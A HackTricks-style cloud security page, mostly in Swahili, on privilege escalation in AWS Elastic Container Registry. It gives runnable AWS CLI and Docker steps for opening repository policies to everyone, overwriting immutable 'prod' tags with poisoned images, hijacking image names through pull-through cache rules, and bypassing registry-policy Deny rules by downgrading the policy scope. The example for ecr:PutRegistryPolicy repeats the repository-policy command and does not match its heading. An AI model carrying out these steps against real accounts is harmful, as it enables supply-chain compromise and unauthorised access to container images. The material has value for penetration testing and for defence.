# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Mshambuliaji mwenye **`ecr:GetAuthorizationToken`** na **`ecr:BatchGetImage`** anaweza kuingia kwenye ECR na kupakua images.

For more info on how to download images:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Athari Inayowezekana:** privesc isiyo ya moja kwa moja kwa kukamata taarifa nyeti kwenye trafiki.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Mshambuliaji mwenye ruhusa zote hizo **anaweza kuingia kwenye ECR na kupakia images**. Hii inaweza kusaidia escalate privileges kwa mazingira mengine ambapo images hizo zinatumika.

To learn how to upload a new image/update one, check:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Kama sehemu iliyotangulia, lakini kwa repositories za umma.

### `ecr:SetRepositoryPolicy`

Mshambuliaji mwenye ruhusa hii anaweza **kubadilisha** **sera** ya **repository** ili kujipa (au hata kumpa kila mtu) **ufikiaji wa kusoma/kuandika**.\
Kwa mfano, katika mfano huu ufikiaji wa kusoma umepewa kila mtu.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
Maudhui ya `my-policy.json`:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Kama sehemu iliyotangulia, lakini kwa ghala za umma.\
Mvamizi anaweza **kubadilisha sera ya ghala** ya ECR Public repository ili kuruhusu ufikiaji wa umma usioidhinishwa au kupandisha mamlaka yake.
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Madhara Yanayoweza Kutokea**: Ufikiaji wa umma usioidhinishwa kwa repositori ya ECR Public, ukiruhusu mtumiaji yeyote push, pull, au delete images.

### `ecr:PutRegistryPolicy`

Mshambuliaji mwenye ruhusa hii anaweza **kubadilisha** **sera ya rejista** ili kujipa yeye mwenyewe, akaunti yake (au hata kila mtu) **read/write access**.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
{{#include ../../../../banners/hacktricks-training.md}}





### ecr:CreatePullThroughCacheRule

Tumia mbaya kanuni za ECR Pull Through Cache (PTC) kuoanisha namespace ya upstream inayodhibitiwa na attacker na prefix ya private ECR inayotambulika. Hii inasababisha workloads zinazovuta kutoka private ECR kupokea kwa uwazi attacker images bila push yoyote kwenye private ECR.

- Idhini zinazohitajika: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. Ikiwa unatumia ECR Public upstream: ecr-public:* ili kuunda/pusha kwenye repo ya umma.
- Imethibitishwa upstream: public.ecr.aws

Hatua (mfano):

1. Tayarisha attacker image katika ECR Public
# Get your ECR Public alias with: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Unda kanuni ya PTC kwenye private ECR ili kuoanisha prefix ya kuaminika na public registry
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Vuta attacker image kupitia njia ya private ECR (hakukuwa na push kwenda private ECR)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Potential Impact: Kuvuruga mnyororo wa usambazaji kwa kupora majina ya ndani ya image chini ya prefix iliyochaguliwa. Workload yoyote inayovuta images kutoka private ECR ikitumia prefix hiyo itapokea maudhui yanayodhibitiwa na attacker.

### `ecr:PutImageTagMutability`

Tumia mbaya ruhusa hii kubadilisha repo yenye tag immutability kuwa mutable na kuandika upya tags za kuaminika (mfano, latest, stable, prod) na maudhui yanayodhibitiwa na attacker.

- Idhini zinazohitajika: `ecr:PutImageTagMutability` pamoja na uwezo wa push (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`).
- Athari: Kuvuruga supply-chain kwa kubadilisha kimya kimya immutable tags bila kubadilisha majina ya tag.

Hatua (mfano):

<details>
<summary>Poison an immutable tag by toggling mutability</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### Uvamizi wa rejista ya kimataifa kupitia sheria ya ROOT Pull-Through Cache

Tengeneza sheria ya Pull-Through Cache (PTC) ukitumia `ecrRepositoryPrefix=ROOT` maalum ili kuoanisha mzizi wa rejista ya ECR ya kibinafsi na rejista ya umma ya juu (mfano, ECR Public). Kila pull kwa repository isiyopo kwenye rejista ya kibinafsi itatumikishwa kwa uwazi kutoka upstream, ikiruhusu kuvamia mnyororo wa usambazaji bila kutuma (push) kwenye ECR ya kibinafsi.

- Ruhusa zinazohitajika: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- Athari: Pulls kwa `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` yatafanikiwa na yataunda moja kwa moja repos za kibinafsi zenye chanzo kutoka upstream.

> Kumbuka: Kwa sheria za `ROOT`, toa `--upstream-repository-prefix`. Kutoa itasababisha kosa la uthibitishaji.

<details>
<summary>Onyesho (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (Shusha `REGISTRY_POLICY_SCOPE` ili kupitisha vikwazo vya registry policy)

Tumia vibaya `ecr:PutAccountSetting` kubadili wigo wa sera ya rejista kutoka `V2` (sera inayotumika kwa vitendo vyote vya ECR) hadi `V1` (sera inayotumika tu kwa `CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage`). Ikiwa sera ya rejista yenye vikwazo Deny inazuia vitendo kama `CreatePullThroughCacheRule`, kushusha hadi `V1` kunafuta utekelezaji huo ili identityâ€‘policy Allows zichukue nafasi.

- Required perms: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- Impact: Uwezo wa kufanya vitendo vya ECR ambavyo awali vilizuia na registry policy Deny (mfano, kuunda sheria za PTC) kwa kuweka wigo kwa muda kuwa `V1`.

Steps (example):

<details>
<summary>Bypass registry policy Deny on CreatePullThroughCacheRule by switching to V1</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>
